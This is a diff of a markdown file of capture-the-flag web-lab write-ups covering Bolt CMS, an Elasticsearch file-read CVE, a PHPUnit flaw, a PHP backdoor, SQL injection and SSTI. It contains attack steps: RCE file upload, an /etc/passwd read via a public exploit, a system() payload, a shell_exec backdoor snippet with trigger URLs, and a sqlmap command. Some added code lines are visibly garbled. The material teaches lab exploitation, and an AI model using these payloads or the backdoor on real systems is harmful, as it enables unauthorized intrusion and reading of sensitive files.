@@ -26,8 +26,7 @@ Here we are naming it dirsearch, so when we run dirsearch now in the terminal, t
 
 
 
-# cybersec-labs
-# bolt
+## bolt
 Let's try: View Page Source, pay attention to p This website is... /p, add /bolt to URL and guess the user and pass (admin, password).
 
 Once you are in you need to go to file management to see if you can upload some malicious files. Let’s try to create and upload a vulnerable rce.html file
@@ -40,8 +39,7 @@ Add cmd=id
 cmd=ls-l
 cat /flag.txt
 CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}
-# elastic
-![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/219165d6-3a23-41a4-8efa-ff035e7b89b1)
+## elastic
 Hints:
 Hint 1:  Elasticsearch < 1.6.1 Arbitrary file read CVE (version)
 
@@ -73,9 +71,8 @@ The exploit can be found here:
 https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
 
 $ python3 exploit.py URL /etc/passwd 
-![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/a2ea58dc-fabc-4f50-a8ee-0ba19366d4c8)
 CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}
-# php unit
+## php unit
 A website is provided as a reference to my unit is feeling a little off. So first we can try to understand php unit. For example, we can use the automatic tool Dirsearch, which brute-force searches for vulnerabilities in directories.
 
 $ dirsearch -u URL
@@ -86,7 +83,7 @@ Vulnerable path. Let’s check: /composer.json where we can understand that our 
 Now exploit the vulnerable path using Burpsuite: < ?php system('cat /flag.txt')? >
 CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}
 
-# nodiff-backdoor
+## nodiff-backdoor
 After performing some recon using *dirsearch* on the targeted web application, we can find a *backup.zip* archive.
 
 $ dirsearch -u URL
@@ -110,30 +107,35 @@ $ grep –r “shell_exec(“
 The next step is to execute the backdoor to access the server based on what we have. 
 If we have the parameter welldone=knockknock, then execute parameter shazam=<injection>
 ![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/5ed643c1-2038-4a23-ba9f-b3c823729699)
-![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/5fbc856c-6241-4c2a-a001-2a9c9174004b)
+function sentimental_function) {
+If ($_
+_GET [ 'welldone'] == 'knockknock') {
+echo shell_exec($_GET[ ' shazam' ]) ;
 Now let’s get the flag in the source of the page:
 http://34.107.45.207:30148/?welldone=knockknock&shazam=id
 
 http://34.107.45.207:30148/?welldone=knockknock&shazam=cat flag.php
 CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}
 
-# schematics
+## SQL
 After a few attempts of web application reconnaissance using dirsearch -u , we obtain a register endpoint.
 choose register.php because it is successful link.
 register
 
 When we put “%” into the field, the list of all the products is showed. At this moment, we can conclude that the page with search functionalities implemented is vulnerable to SQLi injection. To proceed further with the attack, copy the cookie from the POST request obtained with Burp and use SQLmap on it. we use it for the command to have valid session
-![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/fba3f32b-93cc-47b5-a611-bdc69f05c6d9)
+product_name=%25&submit=Search
+
+sqlmap --cookie="PHPSESSID=..." -u URL --forms --colums --random-agent
 CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}
 
 
-# authorization
+## Fask
 try dirsearch and chek urls
 
 for /auth We are not allowed to use GET requests because we got some error, 
 so let’s try to use POST  requests.
 
-# sweet and sour
+## s&s
 Usually, when something similar is noticed, it is recommended to look in the header section of the web application. 
 From header we can obtain, that it is python server and set-cookie is shown right there
 curl -i URL
@@ -146,7 +148,7 @@ After decoding the cookie, we obtain the message "Try harder" and some junk data
 *run python payload change only URl*
 python PayLoad.py
 
-# online-encryption
+## online
 Search for traffic using http filter. 10476... Follow the HTTP stream with the shortcut Ctrl+Alt+Shift+H
 
 Eventually we can spot suspicious traffic to www.txtwizard.net (plain text). filter for 10.0.0...
@@ -160,7 +162,7 @@ https://base64decode.org/
 
 After we convert from base64, we can observe that the new text seems to be obfuscated with: rot13 RPFP{qq545sos12sq608qnn8p201s50s95p8520orp9s744n3573o1qp0op53pr019726}
 
-# shark
+## sea
 Server Side Template Injection
 {{7*7}}
 
